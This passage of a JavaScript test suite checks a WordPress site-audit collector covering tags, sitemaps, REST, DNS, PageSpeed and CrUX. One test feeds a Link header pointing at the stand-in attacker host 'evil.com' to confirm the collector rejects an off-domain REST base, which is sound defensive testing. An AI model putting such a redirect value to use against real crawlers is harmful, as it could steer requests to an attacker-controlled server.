 assert.ok(r.avisos.some(a=>/PageSpeed Insights API/.test(a)));
 assert.ok(!r.avisos.some(a=>/AGENTIC_BROWSING/.test(a)));
 semSegredo(t,r);
});

test('CrUX sem dados (404): sem_dados, nulos e não zeros; celular, computador e a página nem são perguntados', async()=>{
 const t=montar({google:{crux:()=>fj('erro-crux-sem-dados.json')}}),r=await coletar(t.ctx);
 assert.equal(daCrux(t.g).length,2); // a origem toda e o histórico do celular
 assert.deepEqual([r.partes.crux.estado,r.partes.crux.codigo],['ok','sem_dados']);
 assert.equal(r.dados.crux.sem_dados,true);
 assert.deepEqual(r.dados.crux.origem,{todos:null,celular:null,computador:null});
 assert.equal(r.dados.crux.semanas.length,8);
 assert.ok(r.dados.crux.semanas.every(s=>s.celular===null&&s.computador===null));
 assert.ok(codigos(r).includes('crux_sem_dados'));assert.ok(!codigos(r).includes('lcp_lento'));
});

test('cota do Google no fim (429): não insiste na CrUX', async()=>{
 const t=montar({google:{crux:()=>fj('erro-cota.json')}}),r=await coletar(t.ctx);
 assert.equal(daCrux(t.g).length,1);
 assert.deepEqual([r.partes.crux.estado,r.partes.crux.codigo],['erro','cota']);
 assert.equal(r.partes.pagespeed.estado,'ok');
 assert.ok(r.avisos.some(a=>/cota/.test(a)));
 assert.ok(!JSON.stringify(r).includes('000000000000'),'repetiu a mensagem do Google');
});

test('AGENTIC_BROWSING recusado: aviso e nota de agentes nula; as quatro notas principais ficam', async()=>{
 const t=montar({google:{psi:(est,cats)=>cats.includes('AGENTIC_BROWSING')?fj('erro-psi-categoria.json'):fj(est==='MOBILE'?'psi-mobile.json':'psi-desktop.json')}});
 const r=await coletar(t.ctx);
 assert.equal(r.partes.pagespeed.estado,'ok');
 assert.equal(r.dados.pagespeed.celular.notas.desempenho,47);assert.equal(r.dados.pagespeed.celular.notas.agentes,null);
 assert.equal(r.dados.pagespeed.celular.agentes,null);
 // Um aviso, para gente: o nome da categoria da API vai só para o diário.
 assert.equal(r.avisos.filter(a=>/navegação por agentes/.test(a)).length,1);
 assert.equal(r.avisos.some(a=>/AGENTIC_BROWSING/.test(a)),false);
 assert.ok(t.log.some(l=>/AGENTIC_BROWSING/.test(l)));
});

test('PageSpeed com runtimeError: notas e laboratório nulos, nunca zero, e a parte fica parcial', async()=>{
 const l=lerPageSpeed(fj('psi-runtime-error.json'));
 assert.equal(l.erro_execucao,'FAILED_DOCUMENT_REQUEST');
 assert.ok(Object.values(l.notas).every(v=>v===null));assert.ok(Object.values(l.laboratorio).every(v=>v===null));
 assert.deepEqual(l.melhorar,[]);
 const t=montar({google:{psi:(est,cats)=>cats.includes('AGENTIC_BROWSING')?fj('psi-agentes.json'):fj(est==='MOBILE'?'psi-runtime-error.json':'psi-desktop.json')}});
 const r=await coletar(t.ctx);
 assert.deepEqual([r.partes.pagespeed.estado,r.partes.pagespeed.codigo],['parcial','medicao_falhou']);
 assert.equal(r.dados.pagespeed.celular.notas.desempenho,null);assert.equal(r.dados.pagespeed.computador.notas.desempenho,81);
 // O código do Lighthouse vai para o diário; o aviso diz o que aconteceu.
 assert.ok(r.avisos.includes('O PageSpeed não conseguiu medir a página no celular; as notas desse lado ficam em branco.'),r.avisos.join(' | '));
 assert.equal(r.avisos.some(a=>/FAILED_DOCUMENT_REQUEST/.test(a)),false);
 assert.ok(t.log.some(l=>/FAILED_DOCUMENT_REQUEST/.test(l)));
});

test('prazo curto: o PageSpeed nem começa e a parte fica parcial; o resto segue', async()=>{
 const t=montar({prazo:()=>20_000}),r=await coletar(t.ctx);
 assert.equal(doPsi(t.g).length,0);
 assert.deepEqual([r.partes.pagespeed.estado,r.partes.pagespeed.codigo],['parcial','prazo']);
 assert.equal(r.partes.crux.estado,'ok');assert.equal(r.partes.paginas.estado,'ok');
 assert.equal(r.estado,'parcial');
 assert.ok(r.avisos.some(a=>/tempo da coleta acabou/.test(a)));
});

test('prazo esgotado: nada é pedido a ninguém e nada é inventado', async()=>{
 const t=montar({prazo:()=>0}),r=await coletar(t.ctx);
 assert.equal(t.s.pedidos.length,0);assert.equal(t.g.chamadas.length,0);
 for(const p of ['paginas','robots','wordpress','dns','pagespeed','crux'])assert.deepEqual([r.partes[p].estado,r.partes[p].codigo],['parcial','prazo'],p);
 assert.equal(r.estado,'parcial');
 assert.deepEqual(Object.keys(r.dados).sort(),['conferencias','site']);
 assert.deepEqual(r.publicacoes,[]);
 assert.ok(t.log.some(l=>/prazo/.test(l)));
});

test('WAF: 403 na página inicial guarda o status e um trecho curto do corpo, e o resto não some', async()=>{
 const t=montar({chave:null,rotas:{[`${O}/`]:{status:403,corpo:'<html><head><style>x{}</style><script>var s=1</script></head><body><h1>Acesso negado</h1> pelo firewall</body></html>',headers:{}}}});
 const r=await coletar(t.ctx);
 assert.deepEqual([r.partes.paginas.estado,r.partes.paginas.codigo],['erro','http_403']);
 assert.deepEqual([r.partes.versoes.estado,r.partes.versoes.codigo],['erro','http_403']);
 assert.equal(r.partes.wordpress.estado,'ok');assert.equal(r.partes.robots.estado,'ok');
 // O número do HTTP fica no código da parte e no diário; o aviso é para gente.
 assert.ok(r.avisos.some(a=>/recusou o acesso do servidor do Painel/.test(a)),r.avisos.join(' | '));
 assert.equal(r.avisos.some(a=>/403|HTTP/.test(a)),false);
 assert.ok(t.log.some(l=>/HTTP 403/.test(l)));
 assert.ok(!('paginas' in r.dados)&&!('versoes' in r.dados));
 assert.equal(r.estado,'parcial');
 // Se nem a inicial abriu, as outras 14 dariam o mesmo: nenhuma é pedida.
 assert.ok(!t.s.pedidos.some(p=>/page_id=|[?&]p=|cat=/.test(p.url)&&!/rest_route/.test(p.url)),'pediu página à toa');
});

test('parte que falhou NÃO aparece em dados (a coletora mantém a da coleta anterior)', async()=>{
 const t=montar({chave:null,rotas:{[`${O}/robots.txt`]:{status:500,corpo:'erro',headers:{}},'rest:/wp/v2/pages':{lancar:new TypeError('connection reset')}}});
 const r=await coletar(t.ctx);
 assert.deepEqual([r.partes.robots.estado,r.partes.robots.codigo],['erro','http_500']);
 assert.deepEqual([r.partes.wordpress.estado,r.partes.wordpress.codigo],['erro','rede']);
 assert.ok(!('robots' in r.dados)&&!('wordpress' in r.dados));
 assert.ok('paginas' in r.dados&&'sitemap' in r.dados);
 assert.deepEqual(r.publicacoes,[]); // sem a REST, nenhuma publicação (e nenhuma apagada)
 for(const p of Object.values(r.partes))assert.ok(p.coletado_em);
});

// ------------------------------------------------------------- detecção --

test('Clarity: o padrão antigo do levantamento NÃO acha o código oficial; a chamada final acha', ()=>{
 const pagina=fx('pagina-etiquetas.html');
 assert.equal(/clarity[.]ms[/]tag[/]([a-z0-9]+)/.exec(pagina),null); // por que a contraprova mudou o padrão
 const l=lerPagina(pagina);
 assert.deepEqual(l.etiquetas.clarity,['abcd1234ef']);assert.equal(l.sinais.clarity_script,true);
});

test('página inicial: GA4, Ads, rótulo e eventos de DENTRO do script base64 do LiteSpeed, Pixel, SEO, plataforma e contatos', ()=>{
 const sem=lerPagina(fx('home.html').replace(/<script src="data:[^"]*"[^>]*><\/script>/g,''));
 assert.deepEqual(sem.etiquetas.ads_rotulos,[]); // sem decodificar, o rótulo some
 const l=lerPagina(fx('home.html'),{'x-robots-tag':''});
 assert.deepEqual(l.etiquetas.ga4,['G-EXEMPLO123']);assert.deepEqual(l.etiquetas.google_ads,['AW-1234567890']);
 assert.deepEqual(l.etiquetas.ads_rotulos,['AW-1234567890/AbCdEfGh_1']);
 assert.deepEqual(l.etiquetas.meta_pixel,['111122223333444']);assert.equal(l.sinais.meta_script,true);
 assert.deepEqual(l.eventos.gtag,['conversion','generate_lead','trabalhe_conosco']);
 assert.deepEqual(l.eventos.fbq,['PageView','Contact','TrabalheConosco']);
 for(const k of ['gtm','linkedin','pinterest','tiktok','clarity','hotjar','contentsquare'])assert.deepEqual(l.etiquetas[k],[],k);
 assert.equal(l.consentimento.consent_mode,false);assert.equal(l.consentimento.banner,null);
 assert.deepEqual(l.seo,{titulo:'Gráfica Exemplo | Comunicação visual de teste',descricao:'Fachadas, placas e adesivos. Página FICTÍCIA, feita para os testes do conector do site.',canonical:O,robots:'index, follow, max-snippet:-1, max-video-preview:-1, max-image-preview:large',noindex:false,lang:'pt-BR',h1:1});
 assert.equal(l.og.descricao,'Fachadas, placas e adesivos & brindes.');assert.equal(l.og.imagem_largura,1200);assert.equal(l.og.twitter_card,'summary_large_image');
 assert.deepEqual(l.plataforma,{wordpress:'7.1.3',elementor:'3.31.3',woocommerce:null,litespeed_cache:'7.4',yoast:null,seo:'Rank Math',tema:'hello-elementor',scripts_base64:2});
 assert.deepEqual(l.dados_estruturados.tipos,['Organization','WebSite','WebPage','Person','Article']);
 assert.equal(l.dados_estruturados.local_business,false);assert.equal(l.dados_estruturados.logo_http,true);
 assert.deepEqual(l.contatos.whatsapp,['5538900000001','5538900000002']);assert.deepEqual(l.contatos.telefones,['+553890000001']);
 assert.deepEqual(l.contatos.emails,['contato@exemplo.com.br']);assert.deepEqual(l.contatos.instagram_posts,['ABCdef12345','XYZ_98765-q']);
 assert.deepEqual(l.contatos.redes,['https://www.instagram.com/exemplo','https://www.linkedin.com/company/exemplo']);assert.equal(l.contatos.mapa,true);
});

test('padrões corrigidos pela contraprova: Contentsquare, noscript do Pinterest, GTM em pedaços, LinkedIn e TikTok marcados como não confirmados', ()=>{
 const l=lerPagina(fx('pagina-etiquetas.html'));
 assert.deepEqual(l.etiquetas.gtm,['GTM-ABC1234']);assert.deepEqual(l.etiquetas.pinterest,['2612345678901']);
 assert.deepEqual(l.etiquetas.contentsquare,['f1c7e5a9b3d2e']);assert.equal(l.sinais.contentsquare_uxa,true);
 assert.deepEqual(l.etiquetas.hotjar,['3456789']);assert.deepEqual(l.etiquetas.linkedin,['7654321']);assert.equal(l.sinais.linkedin_lintrk,true);
 assert.deepEqual(l.etiquetas.tiktok,['C1ABCDEFGHIJ2345KLMN']);
 assert.deepEqual(l.consentimento,{consent_mode:true,consent_chaves:['ad_storage','ad_user_data','ad_personalization','analytics_storage'],banner:'CookieYes'});
 assert.deepEqual(l.verificacoes,{google_site_verification:true,facebook_domain_verification:true,pinterest:false,bing:false});
 const ds=l.dados_estruturados;
 assert.equal(ds.local_business,true);assert.equal(ds.invalidos,1);assert.equal(ds.telefone,'+55 38 9000-0001');
 assert.equal(ds.endereco,'Rua Fictícia, 1, Cidade Teste, MG');assert.deepEqual(ds.geo,{lat:-16.7,lng:-43.8});assert.equal(ds.horario,true);
 assert.equal(l.seo.h1,2);assert.equal(l.seo.canonical,`${O}/?page_id=151`);
 const soma=somarEtiquetas([{url:`${O}/x`,status:200,...l}]);
 assert.equal(soma.tipos.linkedin.confirmado,false);assert.equal(soma.tipos.tiktok.confirmado,false);assert.equal(soma.tipos.clarity.confirmado,true);
});

test('página sem etiqueta não inventa etiqueta; noindex vem da meta ou do cabeçalho', ()=>{
 const l=lerPagina(fx('pagina-exemplo.html'));
 assert.ok(Object.values(l.etiquetas).every(v=>v.length===0));assert.ok(Object.values(l.sinais).every(v=>v===false));
 assert.equal(l.seo.noindex,true);
 assert.equal(lerPagina('<html><head><title>x</title></head></html>',{'x-robots-tag':'noindex'}).seo.noindex,true);
 const vazia=lerPagina('');
 assert.equal(vazia.seo.titulo,null);assert.equal(vazia.og.imagem_largura,null);assert.equal(vazia.dados_estruturados.geo,null);
});

test('atributos em qualquer ordem e com qualquer aspa; entidades numéricas e nomeadas', ()=>{
 assert.deepEqual(atributos(`<meta content='abc' NAME="google-site-verification" data-x=1>`),{content:'abc',name:'google-site-verification','data-x':'1'});
 assert.equal(decodificarEntidades('Miss&atilde;o &amp; Vis&#227;o &#x41; &ccedil; &naoexiste; &#0;'),'Missão & Visão A ç &naoexiste; &#0;');
 assert.deepEqual(scriptsBase64('<script src="data:text/javascript;base64,!!!"></script>'),[]);
});

// ------------------------------------------------ robots, sitemap, REST --

test('robots: Disallow: / para todos é bloqueio total; Sitemap é lido; grupo do Googlebot vale para ele', ()=>{
 const bloqueado=lerRobots('User-agent: *\nDisallow: /\n# comentário\nSitemap: https://exemplo.com.br/?sitemap=1\n');
 assert.equal(bloqueado.bloqueia_tudo,true);assert.deepEqual(bloqueado.sitemaps,['https://exemplo.com.br/?sitemap=1']);
 const livre=lerRobots(fx('robots.txt'));
 assert.equal(livre.bloqueia_tudo,false);assert.deepEqual(livre.sitemaps,[]);assert.equal(livre.grupos,1);
 const google=lerRobots('User-agent: Googlebot\nUser-agent: Bingbot\nDisallow: /\n\nUser-agent: *\nAllow: /\n');
 assert.equal(google.bloqueia_google,true);assert.equal(google.bloqueia_tudo,false);
});

test('sitemap: índice com &amp; e CDATA; o image:loc não toma o lugar do loc', ()=>{
 const i=lerSitemap(fx('sitemap-indice.xml'));
 assert.equal(i.tipo,'indice');
 assert.deepEqual(i.itens.map(x=>x.loc),[`${O}/?sitemap=post&sitemap_n=1`,`${O}/?sitemap=page&sitemap_n=1`,`${O}/?sitemap=category&sitemap_n=1`]);
 const p=lerSitemap(fx('sitemap-page.xml'));
 assert.equal(p.tipo,'urls');assert.equal(p.itens[0].loc,`${O}/`);assert.equal(p.itens[0].lastmod,'2026-09-27T09:20:34+00:00');
 assert.deepEqual(lerSitemap('<html>não é sitemap</html>'),{tipo:null,itens:[]});
});

test('O CASO RUIM: consertar os links permanentes do WordPress não duplica a publicação (a chave é o link curto ?page_id / ?p)', ()=>{
 // Hoje a REST devolve ?page_id=144 (as URLs bonitas estão em laço de 301);
 // consertadas, a MESMA página (mesmo id) chega com o link bonito. Antes, a
 // url da publicação era o link permanente e a página entrava de novo.
 const hoje=lerWpItens(fj('wp-pages.json'),'page','exemplo.com.br');
 const depois=lerWpItens(fj('wp-pages.json').map(o=>({...o,link:o.id===140?`${O}/`:`${O}/${o.slug}/`})),'page','exemplo.com.br');
 assert.notDeepEqual(depois.map(i=>i.link),hoje.map(i=>i.link),'controle: os links permanentes mudaram mesmo');
 const a=publicacoesDoWordpress(hoje,'site','exemplo.com.br'),b=publicacoesDoWordpress(depois,'site','exemplo.com.br');
 assert.deepEqual(b.map(p=>p.url),a.map(p=>p.url),'a mesma página não vira outra publicação');
 assert.deepEqual(a.map(p=>p.url),[`${O}/?page_id=209`,`${O}/?page_id=151`,`${O}/?page_id=144`,`${O}/?page_id=140`]);
 // Cadastro com www, ou o WordPress trocando para www: a chave não troca junto.
 const comWww=lerWpItens(fj('wp-pages.json').map(o=>({...o,link:String(o.link).replace('://exemplo','://www.exemplo')})),'page','exemplo.com.br');
 assert.deepEqual(publicacoesDoWordpress(comWww,'site','exemplo.com.br').map(p=>p.url),a.map(p=>p.url));
 // Post usa ?p=<id>; o link de agora fica nos dados, para a tela mostrar.
 const post=lerWpItens([{id:77,date_gmt:'2026-09-30T12:00:00',slug:'fachada-nova',link:`${O}/2026/09/fachada-nova/`,title:{rendered:'Fachada nova'}}],'post','exemplo.com.br');
 assert.deepEqual([post[0].tipo,post[0].link,post[0].link_curto],['post',`${O}/2026/09/fachada-nova/`,`${O}/?p=77`]);
 assert.equal(publicacoesDoWordpress(post,'site','exemplo.com.br')[0].url,`${O}/?p=77`);
 // Sem id não há chave estável: fica de fora (antes entraria pelo link).
 assert.deepEqual(publicacoesDoWordpress(lerWpItens([{date_gmt:'2026-09-30T12:00:00',link:`${O}/x/`,title:{rendered:'X'}}],'page','exemplo.com.br'),'site','exemplo.com.br'),[]);
 assert.equal(site.linkCurtoWp('exemplo.com.br','pagina',0),null);assert.equal(site.linkCurtoWp('exemplo.com.br','outro',5),null);
});

test('REST: títulos com entidades, data de publicação no fuso de São Paulo, conteúdo padrão fora das publicações', ()=>{
 const pgs=lerWpItens(fj('wp-pages.json'),'page','exemplo.com.br'),ps=lerWpItens(fj('wp-posts.json'),'post','exemplo.com.br');
 assert.equal(pgs[0].titulo,'Trabalhe conosco \u2013 vagas');assert.equal(pgs[2].titulo,'Missão, visão e valores');
 assert.equal(pgs[0].publicado_em,'2026-09-28T02:30:00Z');
 assert.deepEqual(pgs.map(i=>i.padrao_wp),[false,false,false,false,true]);assert.equal(ps[0].padrao_wp,true);
 assert.deepEqual([pgs[0].tipo,pgs[0].link_curto,ps[0].tipo,ps[0].link_curto],['pagina',`${O}/?page_id=209`,'post',`${O}/?p=1`]);
 const pub=publicacoesDoWordpress([...pgs,...ps,{...pgs[1]},{...pgs[1],link:'https://outro.com.br/x'}],'site','exemplo.com.br');
 assert.deepEqual(pub.map(p=>p.url),[`${O}/?page_id=209`,`${O}/?page_id=151`,`${O}/?page_id=144`,`${O}/?page_id=140`]);
 assert.equal(pub[0].data,'2026-09-27'); // 02:30 em UTC ainda é dia 27 em São Paulo
 assert.ok(pub.every(p=>p.canal==='site'&&!('alcance' in p)&&!('cliques' in p)));
 assert.deepEqual(lerWpItens(null,'page'),[]);
});

test('onde mora a REST: o cabeçalho Link manda, se for do domínio', ()=>{
 const alvo={dominio:'exemplo.com.br',host:'exemplo.com.br'};
 assert.equal(baseDaRest(`<${O}/wp-json/>; rel="https://api.w.org/"`,alvo),`${O}/wp-json/`);
 assert.equal(baseDaRest('<https://evil.com/wp-json/>; rel="https://api.w.org/"',alvo),`${O}/index.php?rest_route=/`);
 assert.equal(baseDaRest(undefined,alvo),`${O}/index.php?rest_route=/`);
 assert.deepEqual(escolherPaginas(`${O}/`,[`${O}`,`${O}/a/`,`https://www.exemplo.com.br/a`,'https://fora.com/b',`${O}/c`],'exemplo.com.br',1),[`${O}/a/`]);
});

// ------------------------------------------------- PageSpeed e CrUX --

test('PageSpeed: notas de 0 a 100, categoria que não veio é null, laboratório, o que melhorar e o campo opcional', ()=>{
 const m=lerPageSpeed(fj('psi-mobile.json'));
 assert.deepEqual(m.notas,{desempenho:47,acessibilidade:88,boas_praticas:96,seo:92,agentes:null});
 assert.deepEqual(m.laboratorio,{fcp_ms:2843,lcp_ms:5121,tbt_ms:215,cls:0.041,si_ms:4400,tti_ms:6012,ttfb_ms:1320});
 assert.equal(m.lighthouse,'13.5.0');assert.equal(m.formato,'mobile');
 assert.equal(m.campo_pagina,null);assert.equal(m.campo_origem,null); // pouco tráfego: null, nunca zero
 // Por categoria: peso, depois a maior economia (1.220 ms antes de 600 ms); passou de 0,9 ou sem nota não entra.
 assert.deepEqual(m.melhorar.map(x=>x.id),['server-response-time','render-blocking-insight','image-delivery-insight','color-contrast','errors-in-console','crawlable-anchors']);
 assert.deepEqual(m.melhorar[0],{categoria:'desempenho',id:'server-response-time',titulo:'O tempo de resposta inicial do servidor foi longo',nota:0,valor:'A raiz do documento levou 1.320 ms',economia_ms:1220});
 assert.ok(!JSON.stringify(m).includes('base64'),'guardou a captura de tela');
 const d=lerPageSpeed(fj('psi-desktop.json'));
 assert.equal(d.notas.seo,null);assert.equal(d.laboratorio.tbt_ms,0);
 assert.deepEqual(d.campo_pagina.lcp_ms,{p75:2300,faixa:'bom'});assert.equal(d.campo_pagina.cls.p75,0.05);assert.equal(d.campo_pagina.caiu_para_origem,true);
 assert.deepEqual(d.campo_pagina.ttfb_ms,{p75:900,faixa:'melhorar'});
 assert.equal(lerPageSpeed({}),null);assert.equal(lerCampoPsi({metrics:{}}),null);
 const a=lerPageSpeed(fj('psi-agentes.json')).agentes;
 assert.deepEqual([a.nota,a.passou,a.total],[60,2,3]);
 assert.match(urlPageSpeed(`${O}/`,'MOBILE',['PERFORMANCE','SEO']),/strategy=MOBILE&locale=pt_BR&category=PERFORMANCE&category=SEO$/);
});

test('CrUX: o p75 do CLS em texto vira número; faixas; partes do LCP; frações; métrica ausente é null', ()=>{
 const c=lerCrux(fj('crux-origem.json'));
 assert.deepEqual(c.metricas.cls,{p75:0.05,bom:0.9,melhorar:0.06,ruim:0.04});
 assert.deepEqual(c.metricas.lcp_ms,{p75:3100,bom:0.6123,melhorar:0.2512,ruim:0.1365});
 assert.deepEqual(c.metricas.rtt_ms,{p75:150,bom:null,melhorar:null,ruim:null});
 assert.deepEqual(c.lcp_partes,{ttfb_ms:1300,atraso_carga_ms:400,duracao_carga_ms:900,atraso_render_ms:250});
 assert.deepEqual(c.periodo,{de:'2026-09-11',ate:'2026-10-08'});assert.equal(c.aparelhos.phone,0.82);
 const pouco=lerCrux({record:{key:{origin:O},metrics:{largest_contentful_paint:{percentiles:{p75:2000}}}}});
 assert.equal(pouco.metricas.inp_ms,null);assert.equal(pouco.lcp_partes,null);assert.equal(pouco.navegacao,null);
 assert.equal(lerCrux(fj('erro-crux-sem-dados.json')),null);
});

test('CrUX History: NaN e null viram null; cada uma das 8 semanas fechadas pega o período que termina no seu sábado', ()=>{
 const h=lerCruxHistorico(fj('crux-historico.json'));
 assert.equal(h.periodos.length,10);assert.equal(h.periodos[9].ate,'2026-10-03');
 assert.equal(h.lcp_ms[2],null);assert.equal(h.lcp_bom[2],null);assert.equal(h.cls[9],0.05);
 const semanas=cwvPorSemana({celular:h,computador:null},semanasFechadas(HOJE));
 assert.deepEqual(semanas.map(s=>s.semana),['2026-08-10','2026-08-17','2026-08-24','2026-08-31','2026-09-07','2026-09-14','2026-09-21','2026-09-28']);
 assert.equal(semanas[0].celular,null); // o período de 15/08 não tem dado: null, não zero
 assert.deepEqual(semanas[7].celular,{lcp_ms:3100,inp_ms:240,cls:0.05,periodo:{de:'2026-09-06',ate:'2026-10-03'}});
 assert.ok(semanas.every(s=>s.computador===null));
});

test('semanasFechadas: a semana de hoje nunca entra (domingo ainda é a semana aberta; segunda fecha a anterior)', ()=>{
 assert.equal(semanasFechadas('2026-10-11').at(-1),'2026-09-28');
 assert.equal(semanasFechadas('2026-10-12').at(-1),'2026-10-05');
 assert.equal(semanasFechadas('2026-10-12',3).length,3);
});

// ----------------------------------------------- DNS, versões, erros --

test('DNS: SPF com e sem aspas, DMARC p=none, MX e verificações; resposta vazia não inventa', ()=>{
 const d=lerDns(fj('dns-txt.json'),fj('dns-dmarc.json'),fj('dns-mx.json'));
 assert.equal(d.spf,'v=spf1 include:_spf.hospedagem-ficticia.com.br -all');
 assert.deepEqual(d.dmarc,{politica:'none',registro:'v=DMARC1; p=none; rua=mailto:dmarc@exemplo.com.br'});
 assert.deepEqual(d.mx,['mx.hospedagem-ficticia.com.br']);
 assert.deepEqual(d.verificacoes,{google_site_verification:false,facebook_domain_verification:false});
 const vazio=lerDns({Status:3},null,null);
 assert.deepEqual(vazio,{spf:null,dmarc:null,mx:[],verificacoes:{google_site_verification:false,facebook_domain_verification:false},txt_total:0});
});

test('versões: 7.4 < 7.9.1 e 3.31.3 < 4.3.4; igual não é atraso; sem versão é null', ()=>{
 assert.equal(versaoAtrasada('7.4','7.9.1'),true);assert.equal(versaoAtrasada('3.31.3','4.3.4'),true);
 assert.equal(versaoAtrasada('7.1.3','7.1.3'),false);assert.equal(versaoAtrasada('10.0','9.9'),false);assert.equal(versaoAtrasada(null,'1'),null);
});

test('motivoGoogle: 404 é sem dados; chave inválida; API desativada; cota; resto', ()=>{
 assert.equal(motivoGoogle(404,fj('erro-crux-sem-dados.json')),'sem_dados');
 assert.equal(motivoGoogle(400,fj('erro-chave-invalida.json')),'chave_recusada');
 assert.equal(motivoGoogle(403,fj('erro-api-desativada.json')),'api_bloqueada');
 assert.equal(motivoGoogle(429,fj('erro-cota.json')),'cota');
 assert.equal(motivoGoogle(400,fj('erro-psi-categoria.json')),'recusado');
 assert.equal(motivoGoogle(401,null),'chave_recusada');assert.equal(motivoGoogle(503,null),'servidor');assert.equal(motivoGoogle(null,null),'sem_resposta');
});

test('fetchJson que devolve envelope {status, json} também é entendido', async()=>{
 const t=montar();
 const original=t.ctx.fetchJson;
 t.ctx.fetchJson=async(url,op)=>{try{return {status:200,json:await original(url,op)};}catch(e){return {status:e.status,json:e.corpo};}};
 const r=await coletar(t.ctx);
 assert.equal(r.partes.crux.estado,'ok');assert.equal(r.partes.pagespeed.estado,'ok');assert.equal(r.partes.dns.estado,'ok');
 const t2=montar({google:{crux:()=>fj('erro-chave-invalida.json')}});
 const o2=t2.ctx.fetchJson;t2.ctx.fetchJson=async(url,op)=>{try{return {status:200,json:await o2(url,op)};}catch(e){return {status:e.status,json:e.corpo};}};
 const r2=await coletar(t2.ctx);
 assert.equal(r2.partes.crux.codigo,'chave_recusada');assert.equal(doPsi(t2.g).length,0);
});

// ---------------------------------------------------------- ponta a ponta --

test('ponta a ponta: tudo certo vira ok, com partes, dados por parte, publicações e as conferências', async()=>{
 const t=montar(),r=await coletar(t.ctx);
 assert.equal(r.estado,'ok',JSON.stringify(r.partes));assert.equal(r.conta,'exemplo.com.br');
 assert.deepEqual(Object.keys(r.partes).sort(),['crux','dns','pagespeed','paginas','robots','sitemap','versoes','wordpress']);
 assert.deepEqual(Object.keys(r.dados).sort(),['conferencias','crux','dns','pagespeed','paginas','robots','site','sitemap','versoes','wordpress']);
 assert.deepEqual(r.semanas,[]);
 assert.deepEqual(r.dados.site,{dominio:'exemplo.com.br',inicio:`${O}/`,nome:'Gráfica Exemplo'});

 // páginas: a inicial, as do sitemap (páginas, post, categoria) e a da REST que faltava no sitemap
 const urls=r.dados.paginas.lista.map(p=>p.url);
 assert.deepEqual(urls,[`${O}/`,`${O}/?page_id=151`,`${O}/?page_id=144`,`${O}/?page_id=2`,`${O}/?p=1`,`${O}/?cat=1`,`${O}/?page_id=209`]);
 const et=r.dados.paginas.etiquetas;
 assert.equal(et.paginas_lidas,7);
 assert.deepEqual(et.tipos.ga4,{ids:['G-EXEMPLO123'],presente:true,paginas:6,sem:[],confirmado:true}); // a ?page_id=2 é noindex
 assert.deepEqual(et.tipos.google_ads.sem,[`${O}/?page_id=144`]);
 assert.deepEqual(et.rotulos_conversao,['AW-1234567890/AbCdEfGh_1']);
 assert.equal(et.consentimento.consent_mode,true);assert.equal(et.verificacoes.google_site_verification,true);
 assert.deepEqual(r.dados.paginas.redirecionamento_www,{de:'https://www.exemplo.com.br/',status:301,para:`${O}/`});
 assert.deepEqual(r.dados.paginas.lista[0].servidor,{server:'nginx/1.24.0',x_powered_by:'PHP/8.3.0',x_cache:'MISS'});

 // robots, sitemap (o laço no sitemap_index.xml e o /?sitemap=1 que funcionou), REST
 assert.deepEqual(r.dados.robots.sitemaps,[]);
 const sm=r.dados.sitemap;
 assert.equal(sm.url,`${O}/?sitemap=1`);assert.equal(sm.tipo,'indice');assert.equal(sm.total_urls,6);assert.equal(sm.subs_nao_lidos,0);
 assert.deepEqual(sm.tentativas.map(x=>x.problema),['laco','http_404',null]);
 assert.equal(sm.ultima_modificacao,'2026-09-28T14:43:11+00:00');
 assert.ok(!('urls_todas' in sm));
 assert.equal(r.dados.wordpress.nome,'Gráfica Exemplo');assert.deepEqual(r.dados.wordpress.plugins,['Rank Math','Elementor','Elementor Pro','LiteSpeed Cache']);
 assert.equal(r.dados.wordpress.paginas.total,5);

 // DNS, versões, PageSpeed, CrUX
 assert.equal(r.dados.dns.dmarc.politica,'none');
 assert.deepEqual(r.dados.versoes,{wordpress:{site:'7.1.3',atual:'7.1.3',desatualizado:false},elementor:{site:'3.31.3',atual:'4.3.4',desatualizado:true},litespeed_cache:{site:'7.4',atual:'7.9.1',desatualizado:true}});
 assert.equal(r.dados.pagespeed.celular.notas.desempenho,47);assert.equal(r.dados.pagespeed.celular.notas.agentes,60);
 assert.equal(r.dados.pagespeed.computador.notas.desempenho,81);
 assert.equal(r.dados.crux.sem_dados,false);assert.equal(r.dados.crux.origem.celular.metricas.lcp_ms.p75,3100);
 assert.equal(r.dados.crux.semanas.length,8);assert.equal(r.dados.crux.semanas[7].computador.lcp_ms,3100);

 // publicações: as 4 páginas de verdade; "Olá, mundo!" e "Página de exemplo" ficam fora
 assert.deepEqual(r.publicacoes,[
  {canal:'site',url:`${O}/?page_id=209`,data:'2026-09-27',titulo:'Trabalhe conosco \u2013 vagas'},
  {canal:'site',url:`${O}/?page_id=151`,data:'2026-09-27',titulo:'Vantagens da comunicação visual'},
  {canal:'site',url:`${O}/?page_id=144`,data:'2026-09-27',titulo:'Missão, visão e valores'},
  {canal:'site',url:`${O}/?page_id=140`,data:'2026-09-27',titulo:'Gráfica Exemplo'}]);
 // O link permanente de hoje fica nos dados, ao lado do link curto (a chave).
 assert.deepEqual(r.dados.wordpress.paginas.itens.find(i=>i.id===140),{id:140,tipo:'pagina',titulo:'Gráfica Exemplo',link:`${O}/`,link_curto:`${O}/?page_id=140`,slug:'inicio',publicado_em:'2026-09-27T03:00:00Z',modificado_em:'2026-09-28T14:45:00Z',padrao_wp:false});

 // conferências: o que a pesquisa achou no site de verdade, reproduzido aqui
 const cs=codigos(r);
 for(const c of ['robots_sem_sitemap','sitemap_laco','conteudo_padrao','fora_do_sitemap','sitemap_atrasado','noindex_no_sitemap','etiqueta_faltando','sem_consentimento',
  'sem_local_business','logo_http','versoes_expostas','cache_miss','desatualizado','dmarc_none','lcp_lento','inp_lento','desempenho_baixo'])assert.ok(cs.includes(c),c);
 for(const c of ['sitemap_ausente','robots_bloqueia_tudo','sem_ga4','search_console_nao_encontrado','meta_dominio_nao_encontrado','www_duplicado','cls_alto','crux_sem_dados','paginas_com_erro'])assert.ok(!cs.includes(c),c);
 const fora=r.dados.conferencias.find(c=>c.codigo==='fora_do_sitemap');
 assert.equal(fora.texto,'1 página publicada não está no sitemap: Trabalhe conosco - vagas.');
 assert.equal(r.dados.conferencias.find(c=>c.codigo==='etiqueta_faltando'&&/Google Ads/.test(c.texto)).texto,'Google Ads não aparece em 1 das 7 páginas lidas: /?page_id=144.');
 assert.equal(r.dados.conferencias.filter(c=>c.codigo==='desatualizado').length,2);
 assert.deepEqual(r.avisos,[]);
 semSegredo(t,r);
});

test('O CASO RUIM: o motivo da parte chega à tela como FRASE (o código curto vai à parte, em "codigo")', async()=>{
